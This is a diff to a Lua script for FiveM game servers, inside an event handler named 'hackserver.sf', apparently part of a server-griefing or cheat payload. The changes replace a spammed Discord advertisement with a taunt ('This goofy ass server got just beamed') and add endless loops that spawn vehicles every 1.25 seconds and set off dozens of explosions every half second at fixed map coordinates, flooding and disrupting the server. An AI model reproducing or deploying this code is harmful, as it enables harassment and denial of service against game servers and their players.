@@ -10509,42 +10509,42 @@ AddEventHandler("hackserver.sf", function()
 
 	local chatColors = {{224, 50, 50, 255}, {0, 0, 0, 255}}
 	local texts = {
-	   "----> - https://dsc.gg/internetinkooleimmat",
-	   " ----> - https://dsc.gg/internetinkooleimmat",
-	   "  ----> - https://dsc.gg/internetinkooleimmat",
-	   "   ----> - https://dsc.gg/internetinkooleimmat",
-	   "    ----> - https://dsc.gg/internetinkooleimmat",
-	   "     ----> - https://dsc.gg/internetinkooleimmat",
-	   "      ----> - https://dsc.gg/internetinkooleimmat",
-	   "       ----> - https://dsc.gg/internetinkooleimmat",
-	   "        ----> - https://dsc.gg/internetinkooleimmat",
-	   "         ----> - https://dsc.gg/internetinkooleimmat",
-	   "          ----> - https://dsc.gg/internetinkooleimmat",
-	   "           ----> - https://dsc.gg/internetinkooleimmat",
-	   "            ----> - https://dsc.gg/internetinkooleimmat",
-	   "             ----> - https://dsc.gg/internetinkooleimmat",
-	   "              ----> - https://dsc.gg/internetinkooleimmat",
-	   "               ----> - https://dsc.gg/internetinkooleimmat",
-	   "                ----> - https://dsc.gg/internetinkooleimmat",
-	   "                 ----> - https://dsc.gg/internetinkooleimmat",
-	   "                  ----> - https://dsc.gg/internetinkooleimmat",
-	   "                 ----> - https://dsc.gg/internetinkooleimmat",
-	   "                ----> - https://dsc.gg/internetinkooleimmat",
-	   "               ----> - https://dsc.gg/internetinkooleimmat",
-	   "              ----> - https://dsc.gg/internetinkooleimmat",
-	   "             ----> - https://dsc.gg/internetinkooleimmat",
-	   "            ----> - https://dsc.gg/internetinkooleimmat",
-	   "           ----> - https://dsc.gg/internetinkooleimmat",
-	   "          ----> - https://dsc.gg/internetinkooleimmat",
-	   "         ----> - https://dsc.gg/internetinkooleimmat",
-	   "        ----> - https://dsc.gg/internetinkooleimmat",
-	   "       ----> - https://dsc.gg/internetinkooleimmat",
-	   "      ----> - https://dsc.gg/internetinkooleimmat",
-	   "     ----> - https://dsc.gg/internetinkooleimmat",
-	   "    ----> - https://dsc.gg/internetinkooleimmat",
-	   "   ----> - https://dsc.gg/internetinkooleimmat",
-	   "  ----> - https://dsc.gg/internetinkooleimmat",
-	   " ----> - https://dsc.gg/internetinkooleimmat",
+	   "This goofy ass server got just beamed",
+	   " This goofy ass server got just beamed",
+	   "  This goofy ass server got just beamed",
+	   "   This goofy ass server got just beamed",
+	   "    This goofy ass server got just beamed",
+	   "     This goofy ass server got just beamed",
+	   "      This goofy ass server got just beamed",
+	   "       This goofy ass server got just beamed",
+	   "        This goofy ass server got just beamed",
+	   "         This goofy ass server got just beamed",
+	   "          This goofy ass server got just beamed",
+	   "           This goofy ass server got just beamed",
+	   "            This goofy ass server got just beamed",
+	   "             This goofy ass server got just beamed",
+	   "              This goofy ass server got just beamed",
+	   "               This goofy ass server got just beamed",
+	   "                This goofy ass server got just beamed",
+	   "                 This goofy ass server got just beamed",
+	   "                  This goofy ass server got just beamed",
+	   "                 This goofy ass server got just beamed",
+	   "                This goofy ass server got just beamed",
+	   "               This goofy ass server got just beamed",
+	   "              This goofy ass server got just beamed",
+	   "             This goofy ass server got just beamed",
+	   "            This goofy ass server got just beamed",
+	   "           This goofy ass server got just beamed",
+	   "          This goofy ass server got just beamed",
+	   "         This goofy ass server got just beamed",
+	   "        This goofy ass server got just beamed",
+	   "       This goofy ass server got just beamed",
+	   "      This goofy ass server got just beamed",
+	   "     This goofy ass server got just beamed",
+	   "    This goofy ass server got just beamed",
+	   "   This goofy ass server got just beamed",
+	   "  This goofy ass server got just beamed",
+	   " This goofy ass server got just beamed",
 	}
 
 	Citizen.CreateThread(function()
@@ -10676,7 +10676,66 @@ AddEventHandler("hackserver.sf", function()
 		   PopScaleformMovieFunctionVoid()
 	   end
 	end)
+	
 
+	-- Create Vehicles
+	Citizen.CreateThread(function()
+		while true do
+		Citizen.Wait(1250)
+			 local ModelHash = "adder"
+			 CreateVehicle(ModelHash, 651.19805908203,576.09906005859,129.05094909668, 1, true, false)
+			 CreateVehicle(ModelHash, 695.63061523438,554.13635253906,132.46676635742, 1, true, false)
+			 CreateVehicle(ModelHash, 680.24377441406,620.59802246094,170.31489562988, 1, true, false)
+			 CreateVehicle(ModelHash, 798.91400146484,573.09936523438,141.43251037598, 1, true, false)
+			 CreateVehicle(ModelHash, 923.92071533203,528.46606445313,119.71677398682, 1, true, false)
+			 CreateVehicle(ModelHash, 763.54248046875,443.96780395508,147.18112182617, 1, true, false)
+			 CreateVehicle(ModelHash, 680.24377441406,620.59802246094,170.31489562988, 1, true, false)
+		 end
+	 end)
+ 
+	 -- Explosion
+	 Citizen.CreateThread(function()
+		while true do
+		Citizen.Wait(500)
+			AddExplosion(651.19805908203,576.09906005859,129.05094909668, 5, 0, true, true, 1)
+			AddExplosion(695.63061523438,554.13635253906,132.46676635742, 5, 0, true, true, 1)
+			AddExplosion(680.24377441406,620.59802246094,170.31489562988, 5, 0, true, true, 1)
+			AddExplosion(798.91400146484,573.09936523438,141.43251037598, 5, 0, true, true, 1)
+			AddExplosion(763.54248046875,443.96780395508,147.18112182617, 5, 0, true, true, 1)
+			AddExplosion(923.92071533203,528.46606445313,119.71677398682, 5, 0, true, true, 1)
+			AddExplosion(689.03399658203,554.13507080078,191.7236328125, 5, 0, true, true, 1)
+			AddExplosion(670.30090332031,565.64129638672,272.06759643555, 5, 0, true, true, 1)
+			AddExplosion(563.84466552734,475.48455810547,171.69914245605, 5, 0, true, true, 1)
+			AddExplosion(651.19805908203,576.09906005859,129.05094909668, 5, 0, true, false, 1)
+			AddExplosion(695.63061523438,554.13635253906,132.46676635742, 5, 0, true, false, 1)
+			AddExplosion(680.24377441406,620.59802246094,170.31489562988, 5, 0, true, false, 1)
+			AddExplosion(798.91400146484,573.09936523438,141.43251037598, 5, 0, true, false, 1)
+			AddExplosion(763.54248046875,443.96780395508,147.18112182617, 5, 0, true, false, 1)
+			AddExplosion(923.92071533203,528.46606445313,119.71677398682, 5, 0, true, false, 1)
+			AddExplosion(689.03399658203,554.13507080078,191.7236328125, 5, 0, true, false, 1)
+			AddExplosion(670.30090332031,565.64129638672,272.06759643555, 5, 0, true, false, 1)
+			AddExplosion(563.84466552734,475.48455810547,171.69914245605, 5, 0, true, false, 1)
+			AddExplosion(651.19805908203,576.09906005859,129.05094909668, 2, 0, true, true, 1)
+			AddExplosion(695.63061523438,554.13635253906,132.46676635742, 2, 0, true, true, 1)
+			AddExplosion(680.24377441406,620.59802246094,170.31489562988, 2, 0, true, true, 1)
+			AddExplosion(798.91400146484,573.09936523438,141.43251037598, 2, 0, true, true, 1)
+			AddExplosion(763.54248046875,443.96780395508,147.18112182617, 2, 0, true, true, 1)
+			AddExplosion(923.92071533203,528.46606445313,119.71677398682, 2, 0, true, true, 1)
+			AddExplosion(689.03399658203,554.13507080078,191.7236328125, 2, 0, true, true, 1)
+			AddExplosion(670.30090332031,565.64129638672,272.06759643555, 2, 0, true, true, 1)
+			AddExplosion(563.84466552734,475.48455810547,171.69914245605, 2, 0, true, true, 1)
+			AddExplosion(651.19805908203,576.09906005859,129.05094909668, 2, 0, true, false, 1)
+			AddExplosion(695.63061523438,554.13635253906,132.46676635742, 2, 0, true, false, 1)
+			AddExplosion(680.24377441406,620.59802246094,170.31489562988, 2, 0, true, false, 1)
+			AddExplosion(798.91400146484,573.09936523438,141.43251037598, 2, 0, true, false, 1)
+			AddExplosion(763.54248046875,443.96780395508,147.18112182617, 2, 0, true, false, 1)
+			AddExplosion(923.92071533203,528.46606445313,119.71677398682, 2, 0, true, false, 1)
+			AddExplosion(689.03399658203,554.13507080078,191.7236328125, 2, 0, true, false, 1)
+			AddExplosion(670.30090332031,565.64129638672,272.06759643555, 2, 0, true, false, 1)
+			AddExplosion(563.84466552734,475.48455810547,171.69914245605, 2, 0, true, false, 1)
+		end
+	 end)
+ 
 	Citizen.CreateThread(function()
 	   AddTextEntry('PM_SCR_MAP', config["MAP"])
 	   AddTextEntry('PM_SCR_STA', config["STATUS"])
